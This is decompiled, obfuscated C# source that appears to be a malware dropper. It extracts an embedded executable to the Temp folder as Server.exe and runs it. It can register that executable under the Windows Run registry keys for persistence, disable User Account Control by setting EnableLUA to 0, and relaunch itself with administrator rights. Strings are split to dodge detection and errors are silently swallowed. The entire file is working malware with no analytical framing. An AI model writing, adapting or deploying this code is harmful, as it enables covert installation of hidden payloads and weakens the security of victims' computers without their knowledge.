using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Security.Principal;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ns0;

internal static class Class0
{
	private static bool bool_0;

	private static bool bool_1;

	public static void smethod_0(bool bool_2, string string_0, string string_1, bool bool_3)
	{
		try
		{
			RegistryKey registryKey = null;
			registryKey = ((!bool_3) ? Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true) : Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true));
			if (bool_2)
			{
				registryKey.SetValue(string_0, string_1);
			}
			else
			{
				registryKey.DeleteValue(string_0, throwOnMissingValue: false);
			}
		}
		catch
		{
		}
	}

	public static void smethod_1(bool bool_2, bool bool_3, bool bool_4, string string_0, string string_1, string string_2, string string_3, string string_4, string string_5)
	{
		try
		{
			string path = Environment.GetEnvironmentVariable(string_2) + "\\" + string_3;
			string text = "";
			text = ((!(string_3 != "")) ? (Environment.GetEnvironmentVariable(string_2) + "\\" + string_4) : (Environment.GetEnvironmentVariable(string_2) + "\\" + string_3 + "\\" + string_4));
			string text2 = "r";
			Directory.CreateDirectory(path);
			text2 += "e";
			text2 += "s";
			ResourceManager resourceManager = new ResourceManager(text2, Assembly.GetExecutingAssembly());
			new ResourceManager(text2, Assembly.GetExecutingAssembly());
			byte[] bytes = (byte[])resourceManager.GetObject(string_5);
			File.WriteAllBytes(text, bytes);
			if (bool_3)
			{
				smethod_0(bool_2: true, string_0, text, bool_3: false);
			}
			if (bool_4)
			{
				smethod_0(bool_2: true, string_1, text, bool_3: true);
			}
			if (bool_2)
			{
				Process.Start(text);
			}
		}
		catch
		{
		}
	}

	private static void Main()
	{
		if (bool_0)
		{
			smethod_5();
		}
		try
		{
			smethod_1(bool_2: true, bool_3: false, bool_4: false, "Kay", "Kay", "Temp", "", "Server.exe", "0");
		}
		catch
		{
		}
		if (bool_1)
		{
			smethod_4();
		}
	}

	private static void smethod_2()
	{
		smethod_3();
	}

	internal static bool smethod_3()
	{
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
		return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
	}

	private static void smethod_4()
	{
		try
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
				registryKey.SetValue("EnableLUA", "0");
				registryKey.Close();
			}
			catch
			{
			}
			RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			registryKey2.SetValue("EnableLUA", "0");
			registryKey2.Close();
		}
		catch
		{
		}
	}

	private static void smethod_5()
	{
		if (!smethod_3())
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.UseShellExecute = true;
			processStartInfo.WorkingDirectory = Environment.CurrentDirectory;
			processStartInfo.FileName = Application.get_ExecutablePath();
			processStartInfo.Verb = "runas";
			try
			{
				Process.Start(processStartInfo);
			}
			catch
			{
				return;
			}
			Process currentProcess = Process.GetCurrentProcess();
			currentProcess.Kill();
		}
	}
}
